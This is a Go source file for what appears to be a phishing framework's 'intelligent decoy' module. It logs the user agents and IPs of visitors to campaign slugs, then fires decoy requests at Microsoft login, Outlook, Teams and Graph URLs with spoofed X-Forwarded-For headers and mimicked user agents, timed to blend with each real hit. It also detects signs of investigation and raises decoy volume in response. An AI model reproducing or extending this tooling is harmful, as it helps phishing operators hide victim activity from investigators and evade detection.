package decoy

import (
	"fmt"
	"math/rand"
	"strings"
	"sync"
	"time"

	"github.com/rs/zerolog/log"
)

// IntelligentDecoyManager automatically manages decoy traffic based on real usage
type IntelligentDecoyManager struct {
	mu                sync.RWMutex
	enabled           bool
	baseIntensity     float64
	currentIntensity  float64
	activeSlugs       map[string]*SlugActivity
	trafficHistory    *TrafficHistory
	patterns          *AdaptivePatterns
	stopChan          chan struct{}
	running           bool
	lastActivityCheck time.Time
}

// SlugActivity tracks activity for each generated slug
type SlugActivity struct {
	Slug      string
	UserID    string
	FirstSeen time.Time
	LastSeen  time.Time
	HitCount  int
	IsActive  bool
	Intensity float64 // Dynamic intensity for this slug
}

// TrafficHistory tracks overall framework usage patterns
type TrafficHistory struct {
	mu              sync.RWMutex
	hourlyHits      map[int]int // hits per hour of day
	dailyPatterns   map[time.Weekday]int
	recentActivity  []time.Time // sliding window of recent hits
	peakIntensity   float64
	baselineTraffic int
}

// AdaptivePatterns learns from real traffic and adapts decoy patterns
type AdaptivePatterns struct {
	mu                 sync.RWMutex
	observedUserAgents []string
	observedIPs        []string
	observedTiming     []time.Duration
	observedPaths      []string
	lastUpdate         time.Time
}

var intelligentManager *IntelligentDecoyManager

// InitIntelligentDecoy starts the smart decoy system
func InitIntelligentDecoy() error {
	intelligentManager = &IntelligentDecoyManager{
		enabled:          true,
		baseIntensity:    0.3, // Always some background noise
		currentIntensity: 0.3,
		activeSlugs:      make(map[string]*SlugActivity),
		trafficHistory: &TrafficHistory{
			hourlyHits:      make(map[int]int),
			dailyPatterns:   make(map[time.Weekday]int),
			recentActivity:  make([]time.Time, 0),
			baselineTraffic: 10, // Expected baseline hits per hour
		},
		patterns: &AdaptivePatterns{
			observedUserAgents: make([]string, 0),
			observedIPs:        make([]string, 0),
			observedTiming:     make([]time.Duration, 0),
			observedPaths:      make([]string, 0),
		},
		stopChan:          make(chan struct{}),
		lastActivityCheck: time.Now(),
	}

	// Start intelligent monitoring
	go intelligentManager.intelligentMonitoring()
	go intelligentManager.adaptiveDecoyGeneration()
	go intelligentManager.activityBasedScaling()

	log.Info().Msg("🧠 Intelligent decoy system initialized")
	return nil
}

// OnSlugHit should be called every time a slug is accessed
func OnSlugHit(slug, userID, userAgent, ip string) {
	if intelligentManager == nil {
		return
	}

	intelligentManager.mu.Lock()
	defer intelligentManager.mu.Unlock()

	now := time.Now()

	// Track slug activity
	if activity, exists := intelligentManager.activeSlugs[slug]; exists {
		activity.LastSeen = now
		activity.HitCount++
		activity.IsActive = true
	} else {
		intelligentManager.activeSlugs[slug] = &SlugActivity{
			Slug:      slug,
			UserID:    userID,
			FirstSeen: now,
			LastSeen:  now,
			HitCount:  1,
			IsActive:  true,
			Intensity: 0.5, // Start with medium intensity for new slugs
		}
	}

	// Update traffic history
	intelligentManager.trafficHistory.mu.Lock()
	hour := now.Hour()
	day := now.Weekday()
	intelligentManager.trafficHistory.hourlyHits[hour]++
	intelligentManager.trafficHistory.dailyPatterns[day]++
	intelligentManager.trafficHistory.recentActivity = append(
		intelligentManager.trafficHistory.recentActivity, now)

	// Keep only last 100 activities for sliding window
	if len(intelligentManager.trafficHistory.recentActivity) > 100 {
		intelligentManager.trafficHistory.recentActivity =
			intelligentManager.trafficHistory.recentActivity[1:]
	}
	intelligentManager.trafficHistory.mu.Unlock()

	// Learn from real traffic patterns
	intelligentManager.patterns.mu.Lock()
	intelligentManager.patterns.observedUserAgents = appendUnique(
		intelligentManager.patterns.observedUserAgents, userAgent)
	intelligentManager.patterns.observedIPs = appendUnique(
		intelligentManager.patterns.observedIPs, ip)
	intelligentManager.patterns.lastUpdate = now
	intelligentManager.patterns.mu.Unlock()

	// Trigger immediate decoy generation around this real hit
	go intelligentManager.generateContextualDecoys(slug, userAgent, ip)

	log.Debug().
		Str("slug", slug).
		Str("user_id", userID).
		Int("total_hits", intelligentManager.activeSlugs[slug].HitCount).
		Msg("📊 Slug activity tracked")
}

// intelligentMonitoring continuously analyzes activity and adjusts intensity
func (i *IntelligentDecoyManager) intelligentMonitoring() {
	ticker := time.NewTicker(30 * time.Second)
	defer ticker.Stop()

	for {
		select {
		case <-i.stopChan:
			return
		case <-ticker.C:
			i.analyzeAndAdjust()
		}
	}
}

// analyzeAndAdjust automatically adjusts decoy intensity based on real activity
func (i *IntelligentDecoyManager) analyzeAndAdjust() {
	i.mu.Lock()
	defer i.mu.Unlock()

	now := time.Now()

	// Count active slugs (hit in last 30 minutes)
	activeCount := 0
	totalHits := 0
	recentHits := 0

	for _, activity := range i.activeSlugs {
		if now.Sub(activity.LastSeen) < 30*time.Minute {
			activeCount++
			totalHits += activity.HitCount

			// Count very recent hits (last 5 minutes)
			if now.Sub(activity.LastSeen) < 5*time.Minute {
				recentHits++
			}
		} else {
			// Mark inactive slugs
			activity.IsActive = false
		}
	}

	// Calculate dynamic intensity based on activity
	var newIntensity float64

	if activeCount == 0 {
		// No active campaigns - minimal background noise
		newIntensity = 0.1
	} else if recentHits > 0 {
		// Recent activity detected - scale up significantly
		newIntensity = 0.6 + float64(recentHits)*0.1
		if newIntensity > 1.0 {
			newIntensity = 1.0
		}
	} else if activeCount > 0 {
		// Some active campaigns but no recent hits - medium intensity
		newIntensity = 0.3 + float64(activeCount)*0.1
		if newIntensity > 0.7 {
			newIntensity = 0.7
		}
	}

	// Smooth intensity changes to avoid sudden spikes
	if newIntensity > i.currentIntensity {
		i.currentIntensity = i.currentIntensity + (newIntensity-i.currentIntensity)*0.3
	} else {
		i.currentIntensity = i.currentIntensity + (newIntensity-i.currentIntensity)*0.1
	}

	log.Debug().
		Int("active_slugs", activeCount).
		Int("recent_hits", recentHits).
		Float64("old_intensity", i.currentIntensity).
		Float64("new_intensity", newIntensity).
		Msg("🧠 Intelligent intensity adjustment")

	// Update the main decoy manager if it exists
	if mainManager := GetDecoyManager(); mainManager != nil {
		mainManager.SetIntensity(i.currentIntensity)

		// Start main manager if not running and we have activity
		if !mainManager.IsRunning() && activeCount > 0 {
			mainManager.StartDecoyTraffic()
			log.Info().Msg("🚀 Auto-started decoy traffic due to slug activity")
		}
	}
}

// generateContextualDecoys creates immediate decoy traffic around real hits
func (i *IntelligentDecoyManager) generateContextualDecoys(slug, realUserAgent, realIP string) {
	// Generate 2-5 decoy requests within 30 seconds of real request
	numDecoys := rand.Intn(4) + 2

	for j := 0; j < numDecoys; j++ {
		// Random delay: some before, some after the real request
		delay := time.Duration(rand.Intn(60)-30) * time.Second
		if delay < 0 {
			delay = -delay // Make it positive but schedule for "before" effect
		}

		go func(delayTime time.Duration, manager *IntelligentDecoyManager) {
			time.Sleep(delayTime)

			// Use similar but different user agent
			decoyUA := manager.generateSimilarUserAgent(realUserAgent)

			// Use similar IP range
			decoyIP := manager.generateSimilarIP(realIP)

			// Generate contextual decoy request
			mainManager := GetDecoyManager()
			if mainManager != nil {
				headers := map[string]string{
					"User-Agent":      decoyUA,
					"X-Forwarded-For": decoyIP,
					"Accept":          "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
				}

				// Choose realistic Microsoft URL
				decoyURL := manager.getContextualDecoyURL()
				mainManager.makeDecoyRequestWithHeaders("GET", decoyURL, headers, nil)
			}
		}(delay, i)
	}

	log.Debug().
		Str("slug", slug).
		Int("decoys_generated", numDecoys).
		Msg("🎭 Generated contextual decoys for real hit")
}

// adaptiveDecoyGeneration continuously generates adaptive background traffic
func (i *IntelligentDecoyManager) adaptiveDecoyGeneration() {
	ticker := time.NewTicker(45 * time.Second)
	defer ticker.Stop()

	for {
		select {
		case <-i.stopChan:
			return
		case <-ticker.C:
			i.generateAdaptiveBackground()
		}
	}
}

// generateAdaptiveBackground creates background traffic that adapts to learned patterns
func (i *IntelligentDecoyManager) generateAdaptiveBackground() {
	if !i.enabled {
		return
	}

	// Use learned patterns from real traffic
	i.patterns.mu.RLock()
	userAgents := make([]string, len(i.patterns.observedUserAgents))
	copy(userAgents, i.patterns.observedUserAgents)
	ips := make([]string, len(i.patterns.observedIPs))
	copy(ips, i.patterns.observedIPs)
	i.patterns.mu.RUnlock()

	// Generate background requests using learned patterns
	numRequests := int(i.currentIntensity * 5) // Scale with current intensity

	for j := 0; j < numRequests; j++ {
		go func(manager *IntelligentDecoyManager) {
			// Random delay to spread requests
			delay := time.Duration(rand.Intn(30)) * time.Second
			time.Sleep(delay)

			var ua, ip string

			// Use learned user agents or fallback to defaults
			if len(userAgents) > 0 {
				ua = userAgents[rand.Intn(len(userAgents))]
			} else {
				ua = getRealisticUserAgents()[rand.Intn(len(getRealisticUserAgents()))]
			}

			// Use learned IP patterns or generate similar ones
			if len(ips) > 0 {
				baseIP := ips[rand.Intn(len(ips))]
				ip = manager.generateSimilarIP(baseIP)
			} else {
				ip = generateIPPool()[rand.Intn(len(generateIPPool()))]
			}

			// Make adaptive decoy request
			mainManager := GetDecoyManager()
			if mainManager != nil {
				headers := map[string]string{
					"User-Agent":      ua,
					"X-Forwarded-For": ip,
				}

				decoyURL := manager.getContextualDecoyURL()
				mainManager.makeDecoyRequestWithHeaders("GET", decoyURL, headers, nil)
			}
		}(i)
	}
}

// activityBasedScaling monitors for unusual patterns that might indicate analysis
func (i *IntelligentDecoyManager) activityBasedScaling() {
	ticker := time.NewTicker(2 * time.Minute)
	defer ticker.Stop()

	for {
		select {
		case <-i.stopChan:
			return
		case <-ticker.C:
			i.detectSuspiciousActivity()
		}
	}
}

// detectSuspiciousActivity looks for patterns that might indicate investigation
func (i *IntelligentDecoyManager) detectSuspiciousActivity() {
	i.trafficHistory.mu.RLock()
	recentActivity := make([]time.Time, len(i.trafficHistory.recentActivity))
	copy(recentActivity, i.trafficHistory.recentActivity)
	i.trafficHistory.mu.RUnlock()

	now := time.Now()

	// Count hits in last 10 minutes
	recentHits := 0
	for _, hitTime := range recentActivity {
		if now.Sub(hitTime) < 10*time.Minute {
			recentHits++
		}
	}

	// Detect unusual patterns
	suspicious := false
	reason := ""

	// Pattern 1: Sudden spike in activity
	if recentHits > i.trafficHistory.baselineTraffic*5 {
		suspicious = true
		reason = "traffic spike detected"
	}

	// Pattern 2: Activity outside normal hours for multiple slugs
	hour := now.Hour()
	if (hour < 6 || hour > 22) && len(i.activeSlugs) > 3 {
		suspicious = true
		reason = "off-hours activity with multiple active slugs"
	}

	// Pattern 3: Too many slugs active simultaneously
	activeCount := 0
	for _, activity := range i.activeSlugs {
		if now.Sub(activity.LastSeen) < 5*time.Minute {
			activeCount++
		}
	}
	if activeCount > 10 {
		suspicious = true
		reason = "excessive concurrent slug activity"
	}

	if suspicious {
		// Automatically increase intensity for protection
		i.mu.Lock()
		oldIntensity := i.currentIntensity
		i.currentIntensity = 0.9 // High intensity for protection
		i.mu.Unlock()

		log.Warn().
			Str("reason", reason).
			Float64("old_intensity", oldIntensity).
			Float64("new_intensity", 0.9).
			Int("recent_hits", recentHits).
			Int("active_slugs", activeCount).
			Msg("🚨 Suspicious activity detected - auto-scaling decoy intensity")

		// Update main manager
		if mainManager := GetDecoyManager(); mainManager != nil {
			mainManager.SetIntensity(0.9)
			if !mainManager.IsRunning() {
				mainManager.StartDecoyTraffic()
			}
		}
	}
}

// Helper functions
func (i *IntelligentDecoyManager) generateSimilarUserAgent(original string) string {
	// Create variations of the original user agent
	variations := []string{
		original, // Sometimes use exact same
		strings.Replace(original, "Chrome/120", "Chrome/119", 1),
		strings.Replace(original, "Chrome/120", "Chrome/121", 1),
		strings.Replace(original, "Windows NT 10.0", "Windows NT 11.0", 1),
		strings.Replace(original, "Win64; x64", "WOW64", 1),
	}
	return variations[rand.Intn(len(variations))]
}

func (i *IntelligentDecoyManager) generateSimilarIP(original string) string {
	// Generate IP in same subnet
	parts := strings.Split(original, ".")
	if len(parts) != 4 {
		return original
	}

	// Vary last octet
	lastOctet := rand.Intn(254) + 1
	return fmt.Sprintf("%s.%s.%s.%d", parts[0], parts[1], parts[2], lastOctet)
}

func (i *IntelligentDecoyManager) getContextualDecoyURL() string {
	microsoftURLs := []string{
		"https://login.microsoftonline.com/common/oauth2/authorize",
		"https://outlook.office.com/mail/inbox",
		"https://teams.microsoft.com/v2/",
		"https://portal.office.com",
		"https://admin.microsoft.com",
		"https://graph.microsoft.com/v1.0/me",
	}
	return microsoftURLs[rand.Intn(len(microsoftURLs))]
}

func appendUnique(slice []string, item string) []string {
	for _, existing := range slice {
		if existing == item {
			return slice
		}
	}
	slice = append(slice, item)

	// Keep only last 50 items to prevent memory growth
	if len(slice) > 50 {
		slice = slice[1:]
	}

	return slice
}

// GetIntelligentManager returns the global intelligent decoy manager
func GetIntelligentManager() *IntelligentDecoyManager {
	return intelligentManager
}
